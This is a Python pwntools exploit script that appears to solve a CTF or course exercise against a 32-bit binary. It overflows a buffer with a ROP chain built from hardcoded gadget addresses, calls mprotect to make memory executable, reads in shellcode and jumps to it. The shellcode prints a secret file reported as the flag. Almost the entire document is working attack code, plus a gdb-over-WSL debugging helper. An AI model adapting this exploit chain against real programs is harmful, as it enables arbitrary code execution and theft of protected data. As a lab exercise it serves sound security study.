#!/usr/bin/env python3
from pwn import *

context.arch = "i686"

file_binary = "10101_YAKOBCHUK_Dmytro"

# FOR LINUX
# env = {'LD_PRELOAD': 'libc.so.6', 'LD_ASLR': 'off'}
# r = process(['setarch', '-R', './10101_YAKOBCHUK_Dmytro'], env = env)
# pause()

# FOR WSL2
def run_exploit(debug, file_breakpoints):
    env = {"LD_PRELOAD": "libc.so.6", "LD_ASLR": "off"}
    p = process(["setarch", "-R", f"./{file_binary}"], env = env)
    if debug == True:
        pid = util.proc.pidof(p)[0]

        gdb = f"gdb -q -p {pid}"
        if file_breakpoints:
            gdb += f" -x {file_breakpoints}"
            print(f"Use breakpoints from {file_breakpoints}")

        new_tab = "wt -p 'PowerShell' -d ."  # Open new tab in Windows Terminal (PowerShell profile and current dir)
        wsl = f"wsl -e bash -c '{gdb}\; exec $BASH'"
        cmd = f"cmd.exe /c start {new_tab} {wsl}"
        os.system(cmd)
        util.proc.wait_for_debugger(pid)
    return p


file_breakpoints = "breaks32.gdb"
r = run_exploit(True, file_breakpoints)

sc = asm(shellcraft.cat('10101_YAKOBCHUK_Dmytro.secret') + shellcraft.echo('\n') + shellcraft.exit(13))

# GADGETS
rnop = p32(0x08049d20)  # ret
peax = p32(0x080b0cda)  # pop eax ; ret
peaxedxebx = p32(0x08058958)  # pop eax ; pop edx ; pop ebx ; ret
mecxeax = p32(0x08093df8)  # mov ecx, eax ; mov eax, ecx ; ret
syscall = p32(0x08071c50)  # int 0x80 ; ret

rwx = p32(0x08048000)

overflow = 898
buf = b'A' * overflow
buf += p32(1337)
buf += rnop * 500

# mprotect rwx
buf += peax
buf += p32(0x1000)
buf += mecxeax
buf += peaxedxebx  # ecx = 0x1000, size
buf += p32(0x7d)  # eax = 0x7d, syscall mprotect
buf += p32(7)  # edx = 7, rwx
buf += rwx  # ebx = buf
buf += syscall

# read shellcode
buf += peax
buf += rwx
buf += mecxeax
buf += peaxedxebx
buf += p32(3)  # eax, syscall read
buf += p32(len(sc))  # edx, size
buf += p32(0)  # ebx, fd
buf += syscall

# jump shellcode
buf += rwx

buf = buf.ljust(4 * overflow + 4 + overflow + 4, b'B')
buf += p32(0xffffd000)

# pause()
log.info('=== buffer')
print(hexdump(buf))

# pause()
r.readline()
r.writeline(buf)
r.readuntil(b'GRANTED!')

log.info('=== shellcode')
print(hexdump(sc))
r.writeline(sc)

# r.interactive()
log.success(f'FLAG {r.readall().strip().decode("ascii")}')
